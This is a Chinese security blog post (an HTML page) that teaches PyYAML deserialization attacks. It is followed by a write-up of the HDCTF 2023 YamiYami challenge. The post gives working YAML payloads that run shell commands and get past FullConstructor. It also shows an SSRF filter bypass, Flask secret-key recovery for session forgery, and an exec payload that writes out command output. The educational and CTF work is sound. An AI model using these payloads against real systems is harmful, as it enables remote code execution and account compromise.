@@ -1,0 +1,432 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PyYAML反序列化学习 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PyYAML反序列化学习 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前置知识
+YAML基础
+YAML最常见的就是来写配置文件，比如 k8s 的所有资源都可以用 YAML 表示。它可以简单表达清单、散列表，标量等数据形态，相比于 JSON 对用户更友好。
+YAML基础语法不在此赘述，记一个反序列化所需要的知识..." />
+    <meta name="keywords" content="反序列化,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PyYAML反序列化学习
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-04-26
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/VdmrICFMJ/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/pyyaml-fan-xu-lie-hua-xue-xi.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前置知识">前置知识</h1>
+<h2 id="yaml基础">YAML基础</h2>
+<p><strong>YAML</strong>最常见的就是来写配置文件，比如 k8s 的所有资源都可以用 YAML 表示。它可以简单表达清单、散列表，标量等数据形态，相比于 JSON 对用户更友好。</p>
+<p><strong>YAML基础语法</strong>不在此赘述，记一个反序列化所需要的知识——<strong>类型转换</strong>。YAML中可以用过<code>!!</code>来对数据的类型进行转换：</p>
+<pre><code class="language-python">&gt;&gt;&gt; document1 = &quot;a: 1&quot;
+&gt;&gt;&gt; document2 = &quot;a: !!str 1&quot;	# 用 !!str 对数字 1 进行类型转换
+&gt;&gt;&gt; d1 = yaml.load(document1)
+&gt;&gt;&gt; d2 = yaml.load(document2)
+&gt;&gt;&gt; print(type(d1['a']))
+&lt;class 'int'&gt;
+&gt;&gt;&gt; print(type(d2['a']))
+&lt;class 'str'&gt;
+</code></pre>
+<h2 id="pyyaml">PyYAML</h2>
+<p>所以只要按照YAML格式就可以实现一个解析YAML的功能，在Python中有一些实现这个解析的库，这里聚焦的是<strong>PyYAML</strong>。</p>
+<p>而这个PyYAML库对<code>!!</code>做了一些魔改。在PyYAML支持一些<code>!!</code>开头的 <strong>YAML</strong> <strong>Tag</strong>，这些Tag可以将不同的内容转换为Python对象。下面是PyYAML支持的 YAML Tag 类型：<br>
+<img src="https://skyblu3519.github.io/post-images/1682494590897.png" alt="" loading="lazy"><br>
+其中红色框中的也是PyYAML实现中存在攻击点的部分。</p>
+<h2 id="pyyaml与序列化">PyYAML与序列化</h2>
+<p>序列化就是把对象转化为可传输的字节序列过程，PyYAML中也支持了这一功能，下面通过一个简单的实验观察下 Python 序列化的特点。</p>
+<p>首先在<code>poc_text.py</code>中写入并执行：</p>
+<pre><code class="language-python">import yaml
+
+
+class poc:
+    def __del__(self):
+        print('Hello Hacker')
+
+
+if __name__ == '__main__':
+    payload = yaml.dump(poc())
+    print(payload)		# 输出为：!!python/object:__main__.poc {}
+</code></pre>
+<p>对输出简单的理解：<code>!!python/object</code>表示要转换的类型，<code>__main__.poc</code>是指向的该文件的<code>poc</code>类。</p>
+<p>现在修改序列化中的<code>__main__</code>为文件名<code>poc_txt</code>，在同一个目录下的另一个文件中写入：</p>
+<pre><code class="language-python">import yaml
+
+payload = '!!python/object:poc_test.poc {}'
+yaml.load(payload)
+</code></pre>
+<p>这段代码执行时，<code>yaml.load</code>根据payload的内容，在<code>poc_txt</code>这个module下寻找<code>poc</code>这个类去读取，然后就会触发<code>poc</code>类中的销毁方法，输出我们的内容。</p>
+<h1 id="攻击思路">攻击思路</h1>
+<h2 id="版本-51">版本 &lt; 5.1</h2>
+<p>&lt;5.1 版本中提供了几个方法用于解析 YAML：</p>
+<ol>
+<li>yaml.load：加载单个 YAML 配置</li>
+<li>yaml.load_all：加载多个 YAML 配置</li>
+</ol>
+<p>构造器：</p>
+<ol>
+<li><strong>BaseConstructor</strong>：最最基础的构造器，不支持强制类型转换</li>
+<li><strong>SafeConstructor</strong>：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改</li>
+<li><strong>Constructor</strong>：在 YAML 规范上新增了很多强制类型转换</li>
+</ol>
+<p><strong>Constructor</strong> 这个是最危险的构造器，却是默认使用的构造器。</p>
+<p>这个版本攻击方式是最简单的，几乎Python中所有模块的类都可以使用，根据PyYAML提供的这几个魔改类型，用对简单的方式构造一个命令执行方式：</p>
+<pre><code class="language-python">payload = '!!python/object/apply:os.system [&quot;ls&quot;]'
+yaml.load(payload)
+</code></pre>
+<p>转换<code>python/object/apply</code>这个类型对应的函数是<code>$PYTHON_HOME/lib/site-packages/yaml/constructor.py</code>中的<code>Constructor.construct_python_object_apply</code>，触发代码执行的是<code>make_python_instance</code>这个函数。<br>
+<img src="https://skyblu3519.github.io/post-images/1682494635155.png" alt="" loading="lazy"></p>
+<p><code>make_python_instance</code>会通过<code>cls(*args, **kwds)</code>调用输入的方法。<br>
+<img src="https://skyblu3519.github.io/post-images/1682494654552.png" alt="" loading="lazy"></p>
+<p>而<code>find_python_name</code>会根据输入的<code>suffix</code>，寻找相应的对象，同时引入对应的模块。在上面这个例子中<code>suffix</code>就是<code>os.system</code>，<code>find_python_name</code>在执行中会 import <code>os</code>这个模块，同时返回<code>system</code>这个方法。<br>
+<img src="https://skyblu3519.github.io/post-images/1682494669547.png" alt="" loading="lazy"></p>
+<h3 id="关键方法">关键方法</h3>
+<p>除了上面的<code>python/object/apply</code>，其他几个<code>Complex Python Tag</code>也有相应的利用方法。</p>
+<h4 id="pythonobjectnew">python/object/new</h4>
+<p>对应的函数是<code>construct_python_object_new</code>，这个函数仅有一行，就是调用 <code>construct_python_object_apply</code>。唯一不同在它指定了newobj参数为True，这在<code>make_python_instance</code>的工作时会有所不同，但大致是一样的。<br>
+<img src="https://skyblu3519.github.io/post-images/1682494718290.png" alt="" loading="lazy"></p>
+<h4 id="pythonobject">python/object</h4>
+<p>对应的函数是<code>construct_python_object</code>，它执行了<code>make_python_instance</code>，也可以调用我们构造的方法。但这里没法传参，所以只能执行无参函数。</p>
+<h4 id="pythonmodule">python/module</h4>
+<p>对应的函数是<code>construct_python_module</code>，仅仅调用了<code>find_python_module</code>，相当于进行了一次<code>import</code>。</p>
+<h4 id="pythonname">python/name</h4>
+<p>对应的函数是<code>construct_python_name</code>，里面调用了 <code>find_python_name</code>，与 <code>python/module</code> 的逻辑极其类似，区别在于，<code>python/module </code>仅仅返回模块而 <code>python/name</code> 返回的是模块下面的属性/方法。后面payload的构造中可以利用来引入方法。</p>
+<h2 id="版本-51-2">版本 &gt;= 5.1</h2>
+<p>新增了构造器：</p>
+<ul>
+<li><strong>BaseConstructor</strong>：没有任何强制类型转换</li>
+<li><strong>SafeConstructor</strong>：只有基础类型的强制类型转换</li>
+<li><strong>FullConstructor</strong>：除了<code>python/object/apply</code>之外都支持，但是加载的模块必须位于 <code>**sys.modules**</code> 中（说明已经主动 import 过了才让加载）。这个是<strong>默认</strong>的构造器。</li>
+<li><strong>UnsafeConstructor</strong>：支持全部的强制类型转换</li>
+<li><strong>Constructor</strong>：等同于 UnsafeConstructor</li>
+</ul>
+<p>新增了加载方法：</p>
+<ul>
+<li><strong>yaml.full_load</strong></li>
+<li><strong>yaml.full_load_all</strong></li>
+<li><strong>yaml.unsafe_load</strong></li>
+<li><strong>yaml.unsafe_load_all</strong></li>
+</ul>
+<h3 id="突破fullconstructor">突破<strong>FullConstructor</strong></h3>
+<p>FullConstructor 中，限制了只允许加载 <code>sys.modules</code> 中的模块，同时取消了<code>construct_python_object_apply</code>函数。那么构造的材料就只能来自于中，由于能力有限这里仅对payload进行记录分析。</p>
+<h4 id="payload1">payload1</h4>
+<pre><code class="language-yaml">!!python/object/new:tuple
+- !!python/object/new:map
+  - !!python/name:eval
+  - [&quot;__import__('os').system('whoami')&quot;]
+</code></pre>
+<p>这个原形是：<code>tuple(map(eval, [&quot;__import__('os').system('whoami')&quot;]))</code>。map函数创建一个迭代器，再由tuple抽取运行。</p>
+<h4 id="payload2">payload2</h4>
+<p>原形：</p>
+<pre><code class="language-python">exp = type(&quot;exp&quot;, (list, ), {&quot;__setstate__&quot;: eval})
+exp.__setstate__(&quot;__import__('os').system('whoami')&quot;)
+</code></pre>
+<p>payload：</p>
+<pre><code class="language-yaml">!!python/object/new:type
+args:
+  - exp
+  - !!python/tuple []
+  - {&quot;extend&quot;: !!python/name:exec }
+listitems: &quot;__import__('os').system('whoami')&quot;
+</code></pre>
+<h4 id="payload3">payload3</h4>
+<p>原形：</p>
+<pre><code class="language-python">exp = type(&quot;exp&quot;, (list, ), {&quot;__setstate__&quot;: eval})
+exp.__setstate__(&quot;__import__('os').system('whoami')&quot;)
+</code></pre>
+<p>payload：</p>
+<pre><code class="language-yaml">!!python/object/new:type
+args:
+  - exp
+  - !!python/tuple []
+  - {&quot;__setstate__&quot;: !!python/name:eval }
+state: &quot;__import__('os').system('whoami')&quot;
+</code></pre>
+<h4 id="payload4">payload4</h4>
+<p>原形：</p>
+<pre><code class="language-python">exp = staticmethod([0])
+exp.__dict__.update(
+    {&quot;update&quot;: eval, &quot;items&quot;: list}
+)
+exp_raise = str()
+# 由于 str 没有 __dict__ 方法，所以在 PyYAML 解析时会触发下面调用
+
+exp.update(&quot;__import__('os').system('whoami')&quot;)
+</code></pre>
+<p>payload：</p>
+<pre><code class="language-yaml">!!python/object/new:str
+    args: []
+    # 通过 state 触发调用
+    state: !!python/tuple
+      - &quot;__import__('os').system('whoami')&quot;
+      # 下面构造 exp
+      - !!python/object/new:staticmethod
+        args: []
+        state: 
+          update: !!python/name:eval
+          items: !!python/name:list  # 不设置这个也可以，会报错但也已经执行成功
+</code></pre>
+<h1 id="hdctf-2023yamiyami">[HDCTF 2023]YamiYami</h1>
+<p>/read?url=路径存在ssrf，利用file协议读文件。</p>
+<p>读取<code>/proc/self/cmdline</code>获取启动文件路径：<code>/app/app.py</code></p>
+<p>check规则<code>re.findall('app.*', url, re.IGNORECASE)</code>。因为是ssrf，所以采用url二次编码绕过：<code>file:///%2561pp/%2561pp.py</code></p>
+<p>审计源码：</p>
+<pre><code class="language-python">@app.route('/boogipop')
+def load():
+    if session.get(&quot;passport&quot;)==&quot;Welcome To HDCTF2023&quot;:
+        LoadedFile=request.args.get(&quot;file&quot;)
+        if not os.path.exists(LoadedFile):
+            return &quot;file not exists&quot;
+        with open(LoadedFile) as f:
+            yaml.full_load(f)
+            f.close()
+        return &quot;van you see&quot;
+    else:
+        return &quot;No Auth bro&quot;
+</code></pre>
+<p>flask session伪造和YAML反序列化</p>
+<h2 id="flask-session伪造">flask session伪造</h2>
+<pre><code class="language-python">random.seed(uuid.getnode())
+app.config['SECRET_KEY'] = str(random.random()*233)
+</code></pre>
+<p><code>uuid.getnode()</code>：返回网卡的MAC地址对应的整数。那么我们可以去读主机的MAC地址，来计算<code>SECRET_KEY</code></p>
+<p>读MAC：file:///sys/class/net/eth0/address</p>
+<p>计算<code>SECRET_KEY</code>：</p>
+<pre><code class="language-python">mac_address = '02:42:ac:02:0d:a0'
+mac_address_int = int(mac_address.replace(&quot;:&quot;, &quot;&quot;), 16)
+print(mac_address_int)
+import random
+random.seed(mac_address_int)
+SECRET_KEY = str(random.random()*233)
+print(SECRET_KEY)
+</code></pre>
+<p>之后使用<code>flask-session-cookie-manager</code>伪造session。</p>
+<h2 id="yaml反序列化">YAML反序列化</h2>
+<p>这里用<code>yaml.full_load</code>加载，所以版本&gt;=5.1。因为在服务器上不像在本地执行有回显，有两个思路：</p>
+<ul>
+<li>写文件来保存执行结果</li>
+<li>反弹shell</li>
+</ul>
+<p>这里我没有服务器，所以用了第一种。注意这里的同级目录是无法写的，但是在源码中我们知道了，文件上传的路径是<code>/app/uploads</code>，所以命令执行的结果可以写在这个目录下的文件中，再通过ssrf读文件。</p>
+<p>上传含有payload的yaml格式文件，读取根目录的文件，同时将输出结果保存到<code>/app/uploads/output2.txt</code>中。<br>
+<img src="https://skyblu3519.github.io/post-images/1682494752305.png" alt="" loading="lazy"></p>
+<pre><code class="language-yaml">!!python/object/new:tuple
+- !!python/object/new:map
+  - !!python/name:exec
+  - [ &quot;import os; result = os.popen('ls /').read(); f = open('/app/uploads/output2.txt', 'w'); f.write(result); f.close()&quot; ]
+</code></pre>
+<p>在页面触发yaml反序列化<br>
+<img src="https://skyblu3519.github.io/post-images/1682494760639.png" alt="" loading="lazy"></p>
+<p>读文件<br>
+<img src="https://skyblu3519.github.io/post-images/1682494772164.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1682494779173.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1682494785361.png" alt="" loading="lazy"></p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://www.freebuf.com/vuls/256243.html">https://www.freebuf.com/vuls/256243.html</a><br>
+<a href="https://pyyaml.org/wiki/PyYAMLDocumentation">https://pyyaml.org/wiki/PyYAMLDocumentation</a><br>
+<a href="https://xz.aliyun.com/t/7923#toc-3">https://xz.aliyun.com/t/7923#toc-3</a><br>
+<a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#">https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a>
+<ul>
+<li><a href="#yaml%E5%9F%BA%E7%A1%80">YAML基础</a></li>
+<li><a href="#pyyaml">PyYAML</a></li>
+<li><a href="#pyyaml%E4%B8%8E%E5%BA%8F%E5%88%97%E5%8C%96">PyYAML与序列化</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">攻击思路</a>
+<ul>
+<li><a href="#%E7%89%88%E6%9C%AC-51">版本 &lt; 5.1</a>
+<ul>
+<li><a href="#%E5%85%B3%E9%94%AE%E6%96%B9%E6%B3%95">关键方法</a>
+<ul>
+<li><a href="#pythonobjectnew">python/object/new</a></li>
+<li><a href="#pythonobject">python/object</a></li>
+<li><a href="#pythonmodule">python/module</a></li>
+<li><a href="#pythonname">python/name</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E7%89%88%E6%9C%AC-51-2">版本 &gt;= 5.1</a>
+<ul>
+<li><a href="#%E7%AA%81%E7%A0%B4fullconstructor">突破<strong>FullConstructor</strong></a>
+<ul>
+<li><a href="#payload1">payload1</a></li>
+<li><a href="#payload2">payload2</a></li>
+<li><a href="#payload3">payload3</a></li>
+<li><a href="#payload4">payload4</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#hdctf-2023yamiyami">[HDCTF 2023]YamiYami</a>
+<ul>
+<li><a href="#flask-session%E4%BC%AA%E9%80%A0">flask session伪造</a></li>
+<li><a href="#yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">YAML反序列化</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/sql-zhu-ru-zhi-quine/">
+              <h3 class="post-title">
+                SQL注入之Quine
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
